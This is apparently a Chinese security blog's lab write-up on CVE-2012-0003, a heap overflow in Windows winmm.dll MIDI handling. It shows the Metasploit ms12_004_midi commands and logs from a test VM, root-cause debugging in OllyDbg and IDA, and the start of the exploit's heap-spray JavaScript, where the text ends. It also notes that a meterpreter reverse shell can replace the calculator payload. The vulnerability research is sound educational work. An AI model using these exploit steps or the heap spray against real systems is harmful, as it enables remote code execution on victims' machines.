<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 3.8.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="01-漏洞描述 漏洞战争：微软的多媒体库 winmm.dll 在处理 MIDI 文件时，由于对数据处理不当导致的堆溢出，攻击者可在网页中嵌入恶意构造的 MIDI 文件来远程执行任意代码。 https://cve.mitre.org：Unspecified vulnerability in winmm.dll in Windows Multimedia Library in Windows Medi">
<meta name="keywords" content="漏洞分析">
<meta property="og:type" content="article">
<meta property="og:title" content="cve-2012-0003漏洞分析（堆溢出）">
<meta property="og:url" content="http://21guns.top/2020/01/24/reverse/cve-2012-0003漏洞分析（堆溢出）/index.html">
<meta property="og:site_name" content="have a nice day">
<meta property="og:description" content="01-漏洞描述 漏洞战争：微软的多媒体库 winmm.dll 在处理 MIDI 文件时，由于对数据处理不当导致的堆溢出，攻击者可在网页中嵌入恶意构造的 MIDI 文件来远程执行任意代码。 https://cve.mitre.org：Unspecified vulnerability in winmm.dll in Windows Multimedia Library in Windows Medi">
<meta property="og:locale" content="zh-CN">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080643.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80641.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080639.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080644.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081038.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080649.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080634.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080657.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080659.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080645.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080641.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080642.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080637.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081033.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080651.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80646.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081034.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080654.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080638.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080703.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080656.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081036.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080647.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080652.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080635.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081035.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080648.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081037.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081030.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80655.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080701.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080640.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-81038.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080700.jpg">
<meta property="og:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-81035.jpg">
<meta property="og:updated_time" content="2022-03-01T07:47:20.457Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="cve-2012-0003漏洞分析（堆溢出）">
<meta name="twitter:description" content="01-漏洞描述 漏洞战争：微软的多媒体库 winmm.dll 在处理 MIDI 文件时，由于对数据处理不当导致的堆溢出，攻击者可在网页中嵌入恶意构造的 MIDI 文件来远程执行任意代码。 https://cve.mitre.org：Unspecified vulnerability in winmm.dll in Windows Multimedia Library in Windows Medi">
<meta name="twitter:image" content="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080643.jpg">

<link rel="canonical" href="http://21guns.top/2020/01/24/reverse/cve-2012-0003漏洞分析（堆溢出）/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>cve-2012-0003漏洞分析（堆溢出） | have a nice day</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">have a nice day</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://21guns.top/2020/01/24/reverse/cve-2012-0003漏洞分析（堆溢出）/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="21Guns">
      <meta itemprop="description" content>
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="have a nice day">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          cve-2012-0003漏洞分析（堆溢出）
        </h1>

        <div class="post-meta">

          
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-01-24 16:31:30" itemprop="dateCreated datePublished" datetime="2020-01-24T16:31:30+08:00">2020-01-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-03-01 15:47:20" itemprop="dateModified" datetime="2022-03-01T15:47:20+08:00">2022-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/软件安全-逆向/" itemprop="url" rel="index"><span itemprop="name">软件安全/逆向</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01-漏洞描述"></a>01-漏洞描述</h1><ul>
<li>漏洞战争：微软的多媒体库 winmm.dll 在处理 MIDI 文件时，由于对数据处理不当导致的堆溢出，攻击者可在网页中嵌入恶意构造的 MIDI 文件来远程执行任意代码。</li>
<li><a href="https://cve.mitre.org：Unspecified" target="_blank" rel="noopener">https://cve.mitre.org：Unspecified</a> vulnerability in winmm.dll in Windows Multimedia Library in Windows Media Player (WMP) in Microsoft Windows XP SP2 and SP3, Server 2003 SP2, Vista SP2, and Server 2008 SP2 allows remote attackers to execute arbitrary code via a crafted MIDI file, aka “MIDI Remote Code Execution Vulnerability.”</li>
</ul>
<h1 id="02-测试环境"><a href="#02-测试环境" class="headerlink" title="02-测试环境"></a>02-测试环境</h1><ul>
<li>目标系统：Windows XP SP3（虚拟机</li>
<li>OllyDebug：动态调试</li>
<li>IDA Pro：静态分析</li>
<li>IExplore 6、Media Player：漏洞软件</li>
<li>Metasploit：漏洞复现、利用</li>
<li>辅助工具：wget-保存mid文件到本地、gflags.exe-开启/关闭hpa、<a id="more"></a></li>
</ul>
<h1 id="03-漏洞复现"><a href="#03-漏洞复现" class="headerlink" title="03-漏洞复现"></a>03-漏洞复现</h1><ol>
<li><p>msf生成恶意文件</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 搜索并使用模块</span></span><br><span class="line">msf5 &gt; search cve-2012-0003</span><br><span class="line">msf5 &gt; use exploit/windows/browser/ms12_004_midi</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload</span></span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt; set payload windows/exec</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload参数，弹出计算器（exploit模块参数保持默认即可</span></span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt; set cmd calc.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击：开启服务器，等待目标连接</span></span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf5 exploit(windows/browser/ms12_004_midi) &gt;</span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/uMMCLOKsr</span><br><span class="line">[*] Local IP: http://127.0.0.1:8080/uMMCLOKsr</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
</li>
<li><p>目标机器xp用IE浏览器打开此恶意URL，成功弹出计算器</p>
<p> 注意：若目标机器中对IE浏览器开启页堆，则IE会直接报错，不会弹出（默认页堆是关闭的</p>
</li>
<li><p>msf中也得到相关记录</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] 192.168.156.151  ms12_004_midi - Request as: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)</span><br><span class="line">[*] 192.168.156.151  ms12_004_midi - Sending html to 192.168.156.151:1184...</span><br><span class="line">[*] 192.168.156.151  ms12_004_midi - Request as: Windows-Media-Player/9.00.00.4503</span><br><span class="line">[*] 192.168.156.151  ms12_004_midi - Sending midi corruption file...</span><br></pre></td></tr></table></figure>
</li>
<li><p>PS：也可设置payload为强大的meterpreter，获取反弹shell</p>
</li>
</ol>
<h1 id="04-准备工作"><a href="#04-准备工作" class="headerlink" title="04-准备工作"></a>04-准备工作</h1><h2 id="4-1-提取样本"><a href="#4-1-提取样本" class="headerlink" title="4.1-提取样本"></a>4.1-提取样本</h2><ol>
<li><p>页堆关闭情况下，计算器会弹出，但IE窗口会马上关闭，来不及提取html</p>
<p> 故先将页堆开启，使其弹出报错框，而不至于让IE关闭。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\Debugging Tools for Windows (x86)&gt;gflags.exe -i IExplore.exe +hpa</span><br><span class="line">Current Registry Settings for IExplore.exe executable are: 02000000</span><br><span class="line">    hpa - Enable page heap</span><br></pre></td></tr></table></figure>
</li>
<li><p>右键-查看源文件，将内容复制并保存为“exploit.html”</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080643.jpg" alt="image-20200120164118860"></p>
</li>
<li><p>html中搜索”mid“，找到相关媒体文件，IE中打开其地址，会默认打开media player，鼓捣一番，发现并不能保存到本地</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80641.jpg" alt="image-20200120164553668"></p>
</li>
<li><p>使用wget会直接404错误，而msf中也会提示未知的UA头</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080639.jpg" alt="image-20200120164932911"></p>
</li>
<li><p>通过–user-agent参数，借用一下IE浏览器的UA头，成功下载</p>
<p> 最终命令为：<code>wget --user-agent &quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot; http://127.0.0.1:8080/uMMCLOKsr/ojGEs.mid</code></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080644.jpg" alt="image-20200120170403958"></p>
</li>
<li><p>修改html中mid路径为相对路径，将二者放置同一目录，搭建本地环境以方便测试。</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081038.jpg" alt="image-20200120171038366"></p>
</li>
</ol>
<h2 id="4-2-MIDI格式"><a href="#4-2-MIDI格式" class="headerlink" title="4.2-MIDI格式"></a>4.2-MIDI格式</h2><ul>
<li><p>MIDI文件由若干块组成，两种块：头块和音轨块</p>
</li>
<li><p>每个块 = 标记 + 长度 + 数据，标记与长度均占4字节，格式如下：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080649.jpg" alt="image-20200123121218589"></p>
</li>
<li><p>头块中的块数据主要包含：格式类型、音轨数和时间计数值</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080634.jpg" alt="image-20200123121444591"></p>
</li>
<li><p>音轨块中的块数据便是音轨事件数据，常见的音轨事件如下</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080657.jpg" alt="image-20200123121543841"></p>
</li>
</ul>
<h2 id="4-3-堆调试技巧"><a href="#4-3-堆调试技巧" class="headerlink" title="4.3-堆调试技巧"></a>4.3-堆调试技巧</h2><ul>
<li><p>堆管理器中提供一些调试选项用于辅助堆调试，通过 Windbg 提供的 gflags. exe或者!gflag 命令来设置，常见调试选项如下</p>
<ul>
<li>htc：堆尾检查，在堆块末尾附加额外的标记信息（通常为 8 字节），用于检査堆块是否发生溢出。</li>
<li>hfc：堆释放检查，在释放堆块时对堆进行各种检査，防止多次释放同一个堆块。</li>
<li>hpc：堆参数检査，对传递给堆管理的参数进行更多的检查。</li>
<li>ust：用户态栈回湖，即将每次调用堆函数的函数调用信息记录到一个数据库中。</li>
<li>htg：堆标志，为堆块增加附加标记，以记录堆块的使用情况或其他信息。</li>
<li>hvc：调用时验证，即每次调用堆函数时都对整个堆进行验证和检査</li>
<li>hpa：启用页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</li>
</ul>
</li>
<li><p>堆尾检查</p>
<ul>
<li>在每个堆块的尾部添加 8 字节内容，若该数据被破坏就说明可能存在堆溢出。</li>
<li>要检测尾部数据是否被破坏，还需要开启堆参数检查hpc 或堆释放检查hfe</li>
<li>用调试器直接打开目标进程，而非附加方式（附加方式无法在堆尾添加额外信息，也就无法进行堆尾检查）</li>
<li>开启堆尾检查和堆参数检査：<code>!gflag +htc +hpc</code></li>
</ul>
</li>
<li><p>页堆机制</p>
<ul>
<li>调试漏洞时，需要定位到导致漏洞的代码</li>
<li>堆尾检査方式主要是堆被破坏后的场景，不利于定位导致漏洞的代码。</li>
<li>开启页堆机制后，堆管理器会在堆块中增加不可访问的栅栏页，当溢出覆盖到栅栏页时就立即触发异常</li>
</ul>
</li>
</ul>
<h1 id="05-漏洞成因"><a href="#05-漏洞成因" class="headerlink" title="05-漏洞成因"></a>05-漏洞成因</h1><p>基于导图推算的漏洞分析方法</p>
<ol start="0">
<li><p>为方便调试：gflags.exe开启页堆、关闭OD的”忽略异常“相关选项</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080659.jpg" alt="image-20200122115206448"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080645.jpg" alt="image-20200122115227100"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080641.jpg" alt="image-20200122115245944"></p>
</li>
<li><p>OD附加IE浏览器，拖入/打开exploit.html，产生访问异常，此处便是崩溃点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080642.jpg" alt="image-20200122115410646"></p>
</li>
<li><p>IDA中打开目标模块winmm.dll（需加载相应的符号文件），找到崩溃点所在地址，F5查看伪C代码，得知引起崩溃的是v25（对其解引用造成的）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080637.jpg" alt="image-20200122115649819"></p>
</li>
<li><p>借助IDA中伪C代码，对v25变量进行追溯，最终找到参数a1（在线绘图：<a href="https://www.draw.io）" target="_blank" rel="noopener">https://www.draw.io）</a></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081033.jpg" alt="image-20200124113602071"></p>
</li>
<li><p>仅通过上述各变量间的联系，暂未发现有价值的信息，现对各变量设置条件记录断点，观察各变量值变化如何</p>
<p>找到能够准确反映变量值的位置，如下表所示：</p>
<p>| 变量   | C代码                        | 汇编指令                      | 记录值 | 地址     |<br>| —— | —————————- | —————————– | —— | ——– |<br>| v1     | v2 = <em>(_DWORD </em>)(v1 + 60);   | mov     esi, [edi+3Ch]        | edi    | 76B2D050 |<br>| v2     | v3 = <em>(_DWORD </em>)v2;          | mov     ecx, [esi]            | esi    | 76B2D06D |<br>| v9     | v11 = <em>(_DWORD </em>)(v9 + v37); | mov     ecx, [ebx+eax]        | ebx    | 76B2D0B5 |<br>| V11    | v13 = v11 &amp; 0xFFFFFF;        | and     ecx, 0FFFFFFh         | ecx    | 76B2D0C3 |<br>| V13    | v35 = v13;                   | mov     [ebp+var_8], ecx      | ecx    | 76B2D0D1 |<br>| V20    | v29 = (_BYTE <em>)(v24 + v20);  | lea     edx, [eax+esi]        | esi    | 76B2D248 |<br>| V21    | v36 = v21 &amp; 0xF0;            | and     dl, 0F0h              | dl     | 76B2D1F3 |<br>| V24    | v25 = (char </em>)(v24 + v20);   | add     esi, eax              | eax    | 76B2D21E |<br>| 参数a1 | if ( !<em>(_DWORD </em>)(a1 + 52) ) | cmp    dword ptr [edi+34h], 0 | edi    | 76B2D044 |</p>
</li>
<li><p>ctrl+g到指定的位置，shift+F4下条件记录断点（暂停程序-从不、记录表达数值-永远）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080651.jpg" alt="image-20200123114834965"></p>
<p> 最终设置的断点如下</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80646.jpg" alt="image-20200123115410150"></p>
</li>
<li><p>ctrl+F2重新运行，alt+L打开日志窗口，得到如下信息：</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081034.jpg" alt="image-20200123115637787"></p>
</li>
<li><p>观察各变量，寻找规律</p>
<ul>
<li>参数a1=v1不变、v2不变</li>
<li>v9递增，增到0x44重新开始</li>
<li>v11=v13</li>
<li>v21等于v11/v13最低位</li>
</ul>
</li>
<li><p>触发访问异常时，v11=v13=0073B29F，v21=9F，由上述MIDI格式所言，0x9n为”打开音符“的音轨类型。</p>
<p> 由此可推断，v11/13为包含参数的音轨事件，v21为具体的音轨事件类型</p>
<p> 打开上述提取到的mid文件，也可证实这一点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080654.jpg" alt="image-20200123122022089"></p>
</li>
<li><p>shift+F2对v11/13下条件断点，当音轨事件为0073B29F时断下，单步跟踪，详细分析</p>
<p> 通过“打开音符”音轨事件计算出偏移0x419，esi中存储的是某基址，基址+偏移后越界，解引用后造成访问异常</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080638.jpg" alt="image-20200123125833593"></p>
</li>
<li><p>继续追踪esi中的基址，IDA中提示为v20局部变量，追根溯源找到参数a1</p>
<p>v20来自v1：<code>v20 = *(_DWORD *)(v1 + 132);</code></p>
<p>v1来自参数a1：<code>v1 = wParam;</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080703.jpg" alt="image-20200123130305451"></p>
</li>
<li><p>光标移至函数名，右键-jump to xref，查看何处调用此函数，从而找到传的参数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080656.jpg" alt="image-20200124113811423"></p>
<p> 参数wParam来自midiOutPlayNextPolyEvent函数内的局部变量v6，而v6来自gpEmuList</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081036.jpg" alt="image-20200124113918189"></p>
</li>
<li><p>查看gpEmuList的引用情况，看“up”方向，w-写操作的，最终找到mesOpen函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080647.jpg" alt="image-20200124114006619"></p>
<p> mesOpen内部又调用了winmmAlloc函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080652.jpg" alt="image-20200124114129683"></p>
<p> 其正是一个堆空间分配函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080635.jpg" alt="image-20200124114301483"></p>
</li>
<li><p>综上所述，做一下变量等价替换，最终得到：esi指向申请的400字节堆空间</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">esi = v20; </span><br><span class="line">v20 = *(_DWORD *)(v1 + <span class="number">132</span>);</span><br><span class="line">==&gt; esi = *(_DWORD *)(v1 + <span class="number">132</span>);</span><br><span class="line">v1 = wParam = gpEmuList;</span><br><span class="line">==&gt; esi = *(_DWORD *)(gpEmuList + <span class="number">132</span>);</span><br><span class="line">gpEmuList = v5;</span><br><span class="line">==&gt; esi = *(_DWORD *)(v5 + <span class="number">132</span>);</span><br><span class="line">*((_DWORD *)v5 + <span class="number">132</span>) = v6;</span><br><span class="line">==&gt; esi = v6;</span><br><span class="line">v6 = winmmAlloc(<span class="number">0x400</span>u);</span><br><span class="line">==&gt; esi = winmmAlloc(<span class="number">0x400</span>u);</span><br><span class="line">==&gt; esi指向申请的<span class="number">400</span>字节堆空间</span><br></pre></td></tr></table></figure>
</li>
<li><p>至此，就能够清晰的看到漏洞是如何形成的：</p>
<ol>
<li>HeapAlloc函数申请0x400字节的堆空间，将堆基址赋值给esi</li>
<li>程序在处理”打开音符“事件时，计算得到偏移0x419</li>
<li>偏移0x419 &gt; 堆空间大小0x400，最终导致堆块的越界访问，产生漏洞</li>
</ol>
</li>
</ol>
<p>PS：此处之所以将其归为堆溢出，而非数组越界索引，是因为它是向固定堆块大小之外的地方执行写操作，而且不存在索引数组的动作，这与堆溢出类似，所以将该漏洞定性为堆溢出也算合理。（摘自《漏洞战争》</p>
<h1 id="06-漏洞利用"><a href="#06-漏洞利用" class="headerlink" title="06-漏洞利用"></a>06-漏洞利用</h1><ol>
<li><p>从exploit.html中提取出关键js代码，共有三部分</p>
<p> （PS：精简过只留大体框架、堆喷射部分并非本文重点</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一部分：进行堆喷射</span></span><br><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line"><span class="keyword">var</span> heap_obj = <span class="keyword">new</span> heapLib.ie(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> code = <span class="built_in">unescape</span>(<span class="string">"xxxxxxxxxxxxxxxx"</span>);</span><br><span class="line"><span class="keyword">var</span> ORF = <span class="string">"%u0c0c%u0c0c"</span>;</span><br><span class="line"><span class="keyword">var</span> nops = <span class="built_in">unescape</span>(ORF);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (nops.length &lt; <span class="number">0x1000</span>) nops+= nops;</span><br><span class="line"><span class="keyword">var</span> shellcode =  nops.substring(<span class="number">0</span>,<span class="number">0x800</span> - code.length) + code;</span><br><span class="line"><span class="keyword">while</span> (shellcode.length &lt; <span class="number">0x40000</span>) shellcode += shellcode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> block = shellcode.substring(<span class="number">0</span>, (<span class="number">0x80000</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span 